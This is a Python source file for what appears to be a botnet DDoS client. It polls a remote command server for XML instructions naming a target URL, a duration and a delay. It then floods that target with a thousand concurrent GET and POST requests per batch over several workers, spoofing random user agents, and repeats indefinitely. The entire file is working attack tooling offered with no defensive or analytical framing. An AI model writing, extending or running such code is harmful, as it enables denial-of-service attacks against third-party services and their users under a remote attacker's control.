import asyncio
import aiohttp
import time
import xml.etree.ElementTree as ET
import random
from fake_useragent import UserAgent

concurrent_requests = 1000
api_url = 'http://srokliluio.great-site.net/api/index.php'
ua = UserAgent()
NUM_THREADS = 2

async def test_connection():
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                print(f"API Status: {response.status}")
                print(f"API Response: {await response.text()}")
        except Exception as e:
            print(f"Connection error: {e}")

async def get_instructions():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200:
                    xml_data = await response.text()
                    print(f"Received XML: {xml_data}")
                    if xml_data:
                        root = ET.fromstring(xml_data)
                        url = root.find('url').text
                        time_val = int(root.find('time').text)
                        wait_val = int(root.find('wait').text)
                        print(f"URL: {url}, Time: {time_val}, Wait: {wait_val}")
                        return url, time_val, wait_val
                else:
                    print(f"API returned status: {response.status}")
                return None, None, None
    except Exception as e:
        print(f"Error in get_instructions: {e}")
        return None, None, None

async def send_request(session, url, method='get'):
    try:
        headers = {
            "User-Agent": ua.random,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": url,
        }
        payload = {'key': 'value'} if method.lower() == 'post' else None
        
        if method.lower() == 'post':
            async with session.post(url, headers=headers, data=payload, timeout=5) as response:
                text = await response.text()
                print(f"POST response: {response.status}")
        else:
            async with session.get(url, headers=headers, timeout=5) as response:
                text = await response.text()
                print(f"GET response: {response.status}")
    except Exception as e:
        print(f"Request failed: {e}")

async def worker(thread_id, url, duration):
    # تعديل TCPConnector لدعم HTTPS مع التحقق من SSL
    connector = aiohttp.TCPConnector(
        limit=concurrent_requests,
        ssl=True,  # تفعيل SSL
        force_close=False,
        keepalive_timeout=30
    )
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=10)
    ) as session:
        start_time = time.time()
        request_count = 0
        while time.time() - start_time < duration:
            tasks = [send_request(session, url, random.choice(['get', 'post'])) 
                    for _ in range(concurrent_requests)]
            await asyncio.gather(*tasks, return_exceptions=True)
            request_count += concurrent_requests
            print(f"Thread {thread_id}: Sent {request_count} requests")
            await asyncio.sleep(0.1)

async def send_requests_in_batch(url, duration):
    tasks = [worker(i, url, duration) for i in range(NUM_THREADS)]
    await asyncio.gather(*tasks)

async def main():
    await test_connection()
    
    while True:
        url, duration, wait = await get_instructions()
        if url and duration is not None and wait is not None:
            if wait > 0:
                print(f"Waiting for {wait} seconds...")
                await asyncio.sleep(wait)
            try:
                print(f"Starting requests to {url} for {duration} seconds")
                await send_requests_in_batch(url, duration)
            except Exception as e:
                print(f"Error in batch requests: {e}")
        else:
            sleep_time = random.randint(60, 180)
            print(f"No valid instructions received, sleeping for {sleep_time} seconds")
            await asyncio.sleep(sleep_time)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Program terminated by user")
